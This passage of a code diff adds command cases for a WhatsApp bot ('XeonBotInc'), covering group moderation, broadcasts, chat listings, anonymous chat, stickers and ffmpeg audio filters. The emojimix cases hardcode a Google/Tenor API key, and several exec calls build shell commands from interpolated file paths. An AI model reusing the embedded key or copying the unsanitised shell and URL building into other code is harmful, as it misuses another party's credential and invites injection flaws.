+                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Successfully Closed The Group*`)).catch((err) => m.reply(jsonformat(err)))
+                } else if (args[0] === 'open'){
+                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Successfully Opened The Group*`)).catch((err) => m.reply(jsonformat(err)))
+                } else {
+                let buttons = [
+                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
+                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mode Group`, botname, m)
+
+             }
+            }
+            break
+            case 'editinfo': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+             if (args[0] === 'open'){
+                await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
+             } else if (args[0] === 'close'){
+                await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
+             } else {
+             let buttons = [
+                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
+                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)
+
+            }
+            }
+            break
+  case 'nsfw': {
+if (!m.isGroup) return m.reply(mess.group)
+if (!isBotAdmins) return m.reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (args[0] === "on") {
+if (AntiNsfw) return m.reply('Already activated')
+ntnsfw.push(from)
+m.reply('Success in turning on nsfw in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`🔖Warning🔖\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiNsfw) return m.reply('Already deactivated')
+let off = ntnsfw.indexOf(from)
+ntnsfw.splice(off, 1)
+m.reply('Success in turning off nsfw in this group')
+} else {
+  let buttonsntnsfw = [
+  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
+  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+  ]
+  await XeonBotInc.sendButtonText(m.chat, buttonsntnsfw, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  }
+  }
+  break
+            case 'antilinkgc': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+                if (args[0] === "on") {
+                if (db.data.chats[m.chat].antilink) return m.reply(`*It's Been Active Before*`)
+                db.data.chats[m.chat].antilink = true
+                m.reply(`*Antilink Now Active !*`)
+                } else if (args[0] === "off") {
+                if (!db.data.chats[m.chat].antilink) return m.reply(`*Not Activated Before*`)
+                db.data.chats[m.chat].antilink = false
+                m.reply(`*Antilink Now Inactive !*`)
+                } else {
+                 let buttons = [
+                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
+                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mode Antilink`, botname, m)
+                }
+             }
+             break
+             case 'mute': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+                if (args[0] === "on") {
+                if (db.data.chats[m.chat].mute) return m.reply(`It's Been Active Before`)
+                db.data.chats[m.chat].mute = true
+                m.reply(`${XeonBotInc.user.name} has been muted in this group !`)
+                } else if (args[0] === "off") {
+                if (!db.data.chats[m.chat].mute) return m.reply(`Not Activated Before`)
+                db.data.chats[m.chat].mute = false
+                m.reply(`${XeonBotInc.user.name} has been unmuted in this group !`)
+                } else {
+                 let buttons = [
+                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
+                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
+                }
+             }
+             break
+case 'chatinfo': {
+if (!m.quoted) m.reply('Reply Message')
+let msg = await m.getQuotedObj()
+if (!m.quoted.isBaileys) return m.reply('The message was not sent by a bot!')
+let teks = ''
+for (let i of msg.userReceipt) {
+let read = i.readTimestamp
+let unread = i.receiptTimestamp
+let waktu = read ? read : unread
+teks += `${global.themeemoji} @${i.userJid.split('@')[0]}\n`
+teks += ` 🔖”—🔖”${global.themeemoji} *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ${global.themeemoji} *Status :* ${read ? 'Read' : 'Sent'}\n\n`
+}
+XeonBotInc.sendTextWithMentions(m.chat, teks, m)
+}
+break
+            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                let response = await XeonBotInc.groupInviteCode(m.chat)
+                XeonBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
+            }
+            break
+            case 'ephemeral': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+                if (!text) throw 'Enter the value enable/disable'
+                if (args[0] === 'enable') {
+                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                } else if (args[0] === 'disable') {
+                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                }
+            }
+            break
+            case 'delete': case 'del': {
+                if (!m.quoted) throw false
+                let { chat, fromMe, id, isBaileys } = m.quoted
+                if (!isBaileys) throw 'The message was not sent by a bot!'
+                XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
+            }
+            break
+            case 'report': case 'bug': {
+            	if (!text) throw `Example : ${prefix + command} Report an error feature`
+               let ownernya = ownernomer + '@s.whatsapp.net'
+               let me = m.sender
+               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${text}`
+               let ments = [ownernya, me]
+               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🔖™THANKS FOR THE REPORT' }, type: 1 }]
+            await XeonBotInc.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
+            let akhji = `Report Sent\nTo Owner @${ownernya.split('@')[0]}\n*Thank you for the report🔖™*\n_Your number will be blocked_\n_If the Report is Only Created_`
+            await XeonBotInc.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
+            }
+            break
+            case 'hehehe': {
+                reactionMessage = {
+                    react: {
+                        text: '🔖¤',
+                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
+                    }
+                }
+                XeonBotInc.sendMessage(m.chat, reactionMessage)
+            }
+            break  
+            break
+ case 'bc': case 'broadcast':
+			    if (!isCreator) throw mess.owner
+		            if (args.length < 2) throw `Enter text`
+		                            var data = await store.chats.all()
+                            for (let i of data) {
+                               XeonBotInc.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\n${q}` })
+                               await sleep(1000)
+                            }
+                            break
+            case 'q': case 'quoted': {
+		if (!m.quoted) return m.reply('Reply Message!!')
+		let wokwol = await XeonBotInc.serializeM(await m.getQuotedObj())
+		if (!wokwol.quoted) return m.reply('The message you replied to does not contain a reply')
+		await wokwol.quoted.copyNForward(m.chat, true)
+            }
+	    break
+            case 'listpc': {
+                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
+                 let teks = `🔖¬£ *PERSONAL CHAT LIST*\n\nTotal Chat : ${anu.length} Chat\n\n`
+                 for (let i of anu) {
+                     let nama = store.messages[i].array[0].pushName
+                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€\n\n`
+                 }
+                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
+             }
+             break
+                case 'listgc': {
+                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
+                 let teks = `🔖¬£ *GROUP CHAT LIST*\n\nTotal Group : ${anu.length} Group\n\n`
+                 for (let i of anu) {
+                     let metadata = await XeonBotInc.groupMetadata(i)
+                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€\n\n`
+                 }
+                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
+             }
+             break
+             case 'listonline': case 'liston': {
+                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
+                    let online = [...Object.keys(store.presences[id]), botNumber]
+                    XeonBotInc.sendText(m.chat, 'Online List:\n\n' + online.map(v => ' @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
+             }
+             break
+            case 'ebinary': {
+            if (!text) throw `Example : ${prefix + command} text`
+            let { eBinary } = require('./lib/binary')
+            let eb = await eBinary(text)
+            m.reply(eb)
+        }
+        break
+            case 'dbinary': {
+            if (!text) throw `Example : ${prefix + command} text`
+            let { dBinary } = require('./lib/binary')
+            let db = await dBinary(text)
+            m.reply(db)
+        }
+        break
+        case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
+                try {
+                let set
+                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
+                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
+                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
+                if (/earrape/.test(command)) set = '-af volume=12'
+                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
+                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
+                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
+                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
+                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
+                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
+                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
+                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
+                if (/audio/.test(mime)) {
+                m.reply(mess.wait)
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                let ran = getRandom('.mp3')
+                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
+                fs.unlinkSync(media)
+                if (err) return m.reply(err)
+                let buff = fs.readFileSync(ran)
+                XeonBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
+                fs.unlinkSync(ran)
+                })
+                } else m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
+                } catch (e) {
+                m.reply(e)
+                }
+                break
+            case 'setcmd': {
+                if (!m.quoted) throw 'Reply Message!'
+                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
+                if (!text) throw `For What Command?`
+                let hash = m.quoted.fileSha256.toString('base64')
+                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
+                global.db.data.sticker[hash] = {
+                    text,
+                    mentionedJid: m.mentionedJid,
+                    creator: m.sender,
+                    at: + new Date,
+                    locked: false,
+                }
+                m.reply(`Done!`)
+            }
+            break
+            case 'delcmd': {
+                let hash = m.quoted.fileSha256.toString('base64')
+                if (!hash) throw `No hashes`
+                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
+                delete global.db.data.sticker[hash]
+                m.reply(`Done!`)
+            }
+            break
+            case 'listcmd': {
+                let teks = `
+*List Hash*
+Info: *bold* hash is Locked
+${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
+`.trim()
+                XeonBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
+            }
+            break
+            case 'lockcmd': {
+                if (!isCreator) throw mess.owner
+                if (!m.quoted) throw 'Reply Message!'
+                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
+                let hash = m.quoted.fileSha256.toString('base64')
+                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
+                global.db.data.sticker[hash].locked = !/^un/i.test(command)
+                m.reply('Done!')
+            }
+            break
+            case 'addmsg': {
+                if (!m.quoted) throw 'Reply Message You Want To Save In Database'
+                if (!text) throw `Example : ${prefix + command} filename`
+                let msgs = global.db.data.database
+                if (text.toLowerCase() in msgs) throw `'${text}' registered in the message list`
+                msgs[text.toLowerCase()] = quoted.fakeObj
+m.reply(`Successfully added message in message list as '${text}'
+    
+Access with ${prefix}getmsg ${text}
+
+View list of Messages With ${prefix}listmsg`)
+            }
+            break
+            case 'getmsg': {
+                if (!text) throw `Example : ${prefix + command} file name\n\nView message list with ${prefix}listmsg`
+                let msgs = global.db.data.database
+                if (!(text.toLowerCase() in msgs)) throw `'${text}' not listed in the message list`
+                XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
+            }
+            break
+            case 'listmsg': {
+                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
+	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
+		let teks = 'ã€Œ DATABASE LIST ã€\n\n'
+		for (let i of seplit) {
+		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€\n\n`
+	        }
+	        m.reply(teks)
+	    }
+	    break
+            case 'delmsg': case 'deletemsg': {
+	        let msgs = global.db.data.database
+	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' not listed in the message list`)
+		delete msgs[text.toLowerCase()]
+		m.reply(`Successfully deleted '${text}' from the message list`)
+            }
+	    break
+	    case 'anonymous': {
+                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
+				this.anonymous = this.anonymous ? this.anonymous : {}
+				let buttons = [
+                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
+                ]
+                XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await XeonBotInc.getName(m.sender)} Welcome To Anonymous Chat\n\nClick the button below to find a partner\`\`\``, botname, m)
+            }
+			break
+            case 'keluar': case 'leave': {
+                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
+                this.anonymous = this.anonymous ? this.anonymous : {}
+                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
+                if (!room) {
+                    let buttons = [
+                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press Button To Find Partner \`\`\``)
+                    throw false
+                }
+                m.reply('Ok')
+                let other = room.other(m.sender)
+                if (other) await XeonBotInc.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
+                delete this.anonymous[room.id]
+                if (command === 'leave') break
+            }
+            case 'mulai': case 'start': {
+                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
+                this.anonymous = this.anonymous ? this.anonymous : {}
+                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
+                    let buttons = [
+                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`You are still in an anonymous session, press the button below to terminate your anonymous session\`\`\``, botname, m)
+                    throw false
+                }
+                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
+                if (room) {
+                    let buttons = [
+                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
+                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
+                    room.b = m.sender
+                    room.state = 'CHATTING'
+                    await XeonBotInc.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
+                } else {
+                    let id = + new Date
+                    this.anonymous[id] = {
+                        id,
+                        a: m.sender,
+                        b: '',
+                        state: 'WAITING',
+                        check: function (who = '') {
+                            return [this.a, this.b].includes(who)
+                        },
+                        other: function (who = '') {
+                            return who === this.a ? this.b : who === this.b ? this.a : ''
+                        },
+                    }
+                    let buttons = [
+                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
+                }
+                break
+            }
+            case 'next': case 'lanjut': {
+                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
+                this.anonymous = this.anonymous ? this.anonymous : {}
+                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
+                if (!romeo) {
+                    let buttons = [
+                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`You are not in an anonymous session, press the button to find a partner\`\`\``)
+                    throw false
+                }
+                let other = romeo.other(m.sender)
+                if (other) await XeonBotInc.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
+                delete this.anonymous[romeo.id]
+                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
+                if (room) {
+                    let buttons = [
+                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
+                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
+                    room.b = m.sender
+                    room.state = 'CHATTING'
+                    await XeonBotInc.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
+                } else {
+                    let id = + new Date
+                    this.anonymous[id] = {
+                        id,
+                        a: m.sender,
+                        b: '',
+                        state: 'WAITING',
+                        check: function (who = '') {
+                            return [this.a, this.b].includes(who)
+                        },
+                        other: function (who = '') {
+                            return who === this.a ? this.b : who === this.b ? this.a : ''
+                        },
+                    }
+                    let buttons = [
+                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
+                }
+                break
+            }
+            case 'public': {
+                if (!isCreator) throw mess.owner
+                XeonBotInc.public = true
+                m.reply('*Successful in Changing To Public Usage*')
+            }
+            break
+            case 'self': {
+                if (!isCreator) throw mess.owner
+                XeonBotInc.public = false
+                m.reply('*Successful in Changing To Self Usage*')
+            }
+            break
+            case 'ping': case 'p': case 'botstatus': case 'statusbot': {
+                const used = process.memoryUsage()
+                const cpus = os.cpus().map(cpu => {
+                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
+			        return cpu
+                })
+                const cpu = cpus.reduce((last, cpu, _, { length }) => {
+                    last.total += cpu.total
+                    last.speed += cpu.speed / length
+                    last.times.user += cpu.times.user
+                    last.times.nice += cpu.times.nice
+                    last.times.sys += cpu.times.sys
+                    last.times.idle += cpu.times.idle
+                    last.times.irq += cpu.times.irq
+                    return last
+                }, {
+                    speed: 0,
+                    total: 0,
+                    times: {
+			            user: 0,
+			            nice: 0,
+			            sys: 0,
+			            idle: 0,
+			            irq: 0
+                }
+                })
+                let timestamp = speed()
+                let latensi = speed() - timestamp
+                neww = performance.now()
+                oldd = performance.now()
+                respon = `
+Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
+
+🔖’» Info Server
+RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
+
+_NodeJS Memory Usaage_
+${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
+
+${cpus[0] ? `_Total CPU Usage_
+${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
+_CPU Core(s) Usage (${cpus.length} Core CPU)_
+${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
+                `.trim()
+                m.reply(respon)
+            }
+            break
+            case 'speedtest': {
+            m.reply('Testing Speed...')
+            let cp = require('child_process')
+            let { promisify } = require('util')
+            let exec = promisify(cp.exec).bind(cp)
+          let o
+          try {
+          o = await exec('python speed.py')
+          } catch (e) {
+          o = e
+         } finally {
+        let { stdout, stderr } = o
+        if (stdout.trim()) m.reply(stdout)
+        if (stderr.trim()) m.reply(stderr)
+            }
+            }
+            break
+            case 'owner': case 'creator': {
+                XeonBotInc.sendContact(m.chat, global.owner, m)
+            }
+            break
+            case 'setmenu': {
+            if (!isCreator) throw mess.owner
+            let setbot = db.data.settings[botNumber]
+               if (args[0] === 'templateImage'){
+                setbot.templateImage = true
+                setbot.templateVideo = false
+                setbot.templateGif = false
+                setbot.templateMsg = false
+                m.reply(mess.success)
+                } else if (args[0] === 'templateVideo'){
+                setbot.templateImage = false
+                setbot.templateVideo = true
+                setbot.templateGif = false
+                setbot.templateMsg = false
+                m.reply(mess.success)
+                } else if (args[0] === 'templateGif'){
+                setbot.templateImage = false
+                setbot.templateVideo = false
+                setbot.templateGif = true
+                setbot.templateMsg = false
+                m.reply(mess.success)
+                } else if (args[0] === 'templateMessage'){
+                setbot.templateImage = false
+                setbot.templateVideo = false
+                setbot.templateGif = false
+                setbot.templateMsg = true
+                m.reply(mess.success)
+                } else {
+                let sections = [
+                {
+                title: "CHANGE MENU BOT",
+                rows: [
+                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
+                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
+                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
+                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
+                ]
+                },
+                ]
+                XeonBotInc.sendListMsg(m.chat, `pilih aja *${pushname}* the set menu!`, botname, `*Hello sis* !`, `Choose Set Menu`, sections, m)
+                }
+            }
+            break
+            
+            case 'sticker': case 's': case 'stickergif': case 'sgif': {
+            if (!quoted) throw `*Reply Video/Image With Caption* ${prefix + command}`
+            m.reply(mess.wait)
+                    if (/image/.test(mime)) {
+                let media = await quoted.download()
+                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+                await fs.unlinkSync(encmedia)
+            } else if (/video/.test(mime)) {
+                if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maximum 10 seconds!*')
+                let media = await quoted.download()
+                let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+                await fs.unlinkSync(encmedia)
+            } else {
+                throw `*Send Image/Video With Caption* ${prefix + command}\nDuration *Video 1-9 Seconds*`
+                }
+            }
+            break
+         case 'emojimix': {
+		let [emoji1, emoji2] = text.split`+`
+		if (!emoji1) throw `Example : ${prefix + command} 🔖˜…+🔖¤”`
+		if (!emoji2) throw `Example : ${prefix + command} 🔖˜…+🔖¤”`
+		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
+		for (let res of anu.results) {
+		    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
+		    await fs.unlinkSync(encmedia)
+		}
+	    }
+	    break
+	    case 'emojimix2': {
+	    if (!text) throw `Example : ${prefix + command} 🔖˜…`
+		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
+		for (let res of anu.results) {
+		    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
+		    await fs.unlinkSync(encmedia)
+		}
+	    }
+	    break
+	       case 'attp': case 'ttp': {
+           if (!text) throw `Example : ${prefix + command} text`
+           await XeonBotInc.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'XeonBotInc', 'morou', m, {asSticker: true})
+
+         }
+         break
+         case 'tts': {
+         	if (!text) throw `Example : ${prefix + command} text`
+             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_en?query=${text}`)
+             XeonBotInc.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', fileName: `${text}.mp3` }, { quoted: fvn })
+         	}
+         break 
+            case 'toimage': case 'toimg': {
+                if (!quoted) throw 'Reply Image'
+                if (!/webp/.test(mime)) throw `Reply sticker with caption *${prefix + command}*`
+                m.reply(mess.wait)
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                let ran = await getRandom('.png')
+                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
+                    fs.unlinkSync(media)
+                    if (err) throw err
+                    let buffer = fs.readFileSync(ran)
+                    XeonBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m })
+                    fs.unlinkSync(ran)
+                })
+            }
+            break
+	        case 'tomp4': case 'tovideo': {
+                if (!quoted) throw 'Reply Image'
+                if (!/webp/.test(mime)) throw `reply sticker with caption *${prefix + command}*`
+                m.reply(mess.wait)
+		let { webp2mp4File } = require('./lib/uploader')
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                let webpToMp4 = await webp2mp4File(media)
+                await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
+                await fs.unlinkSync(media)
+            }
+            break
+            case 'toaud': case 'toaudio': {
+            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`
+            if (!quoted) throw `Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`
+            m.reply(mess.wait)
+            let media = await quoted.download()
+            let { toAudio } = require('./lib/converter')
+            let audio = await toAudio(media, 'mp4')
+            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
+            }
+            break
+            case 'tomp3': {
+            if (/document/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
+            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
+            if (!quoted) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
+            m.reply(mess.wait)
+            let media = await quoted.download()
+            let { toAudio } = require('./lib/converter')
+            let audio = await toAudio(media, 'mp4')
+            XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${XeonBotInc.user.name}.mp3`}, { quoted : m })
+            }
+            break
+            case 'tovn': case 'toptt': {
+            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`
